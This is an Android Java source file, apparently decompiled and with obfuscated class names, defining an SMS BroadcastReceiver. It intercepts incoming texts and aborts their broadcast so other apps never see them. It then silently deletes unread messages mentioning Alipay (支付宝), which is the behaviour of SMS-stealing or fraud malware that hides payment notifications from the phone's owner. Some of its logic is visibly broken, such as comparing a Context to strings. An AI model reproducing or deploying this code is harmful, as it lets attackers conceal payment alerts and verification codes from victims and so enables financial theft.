package com.ellison.project.r;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.ellison.project.activity.StartActivity;
import com.ellison.project.utils.Constant;
import com.ellison.project.utils.LLLL;

/**
 * @author ellison
 * @date 2020年09月27日
 * @desc 用一句话描述这个类的作用
 */
public class RRRR extends BroadcastReceiver {
    private String tag = RRRR.class.getSimpleName();

    public void deleteSMS(Context paramContext, String paramString) {
        try {
            Object localObject = Uri.parse("content://sms/inbox");
            localObject = paramContext.getContentResolver().query((Uri) localObject, null, "read=0", null, null);
            while (((Cursor) localObject).moveToNext()) {
                if (((Cursor) localObject).getString(((Cursor) localObject).getColumnIndex("body")).trim().equals(paramString)) {
                    int i = ((Cursor) localObject).getInt(((Cursor) localObject).getColumnIndex("_id"));
                    ContentResolver localContentResolver = paramContext.getContentResolver();
                    Uri localUri = Uri.parse("content://sms");
                    StringBuilder localStringBuilder = new StringBuilder();
                    localStringBuilder.append("_id=");
                    localStringBuilder.append(i);
                    localContentResolver.delete(localUri, localStringBuilder.toString(), null);
                }
            }
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @RequiresApi(api = 26)
    @Override
    public void onReceive(Context paramContext, @Nullable Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            abortBroadcast();
            Object[] pduses = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] smsMessages = new SmsMessage[pduses.length];
            int j = 0;
            for (int i = 0; i < pduses.length; i++) {
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) pduses[i]);
            }
            new StringBuilder();
            PendingIntent.getBroadcast(paramContext, 0, new Intent(), 0);
            SmsManager.getDefault();
            try {
                int k = smsMessages.length;
                for (int i = j; i < k; i++) {
                    SmsMessage smsMessage = smsMessages[i];
                    smsMessage.getDisplayOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    if (messageBody.contains("支付宝")) {
                        deleteSMS(paramContext, messageBody);
                    }
                }
                if (paramContext == null) {
                    return;
                }
            } catch (Exception localException) {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("读取信息出错");
                stringBuilder.append(localException.getMessage());
                sendMsg(paramContext, stringBuilder.toString());
            }
        }
        if ((intent != null) && (!TextUtils.isEmpty(intent.getAction())) && (intent.getAction().equals(Constant.SRAction))) {
            String order = intent.getStringExtra("order");
            if (!TextUtils.isEmpty(order) && !order.equals("data")) {
                if (paramContext.equals("serviceCreate")) {
                    if (LLLL.mInf != null) {
                        LLLL.mInf.startFinish();
                    }
                } else if ((paramContext.equals("serviceDestroy")) && (LLLL.mInf != null)) {
                    LLLL.mInf.destory();
                }
            } else {
                intent.getStringExtra("code");
                StartActivity.sendMessage(intent.getStringExtra("notice"));
            }
        }
    }

    public static void sendMsg(Context paramContext, String paramString)
    {
        Intent localIntent = new Intent();
        localIntent.putExtra("msg", paramString);
        localIntent.setAction(Constant.SRAction);
        paramContext.sendBroadcast(localIntent);
    }
}

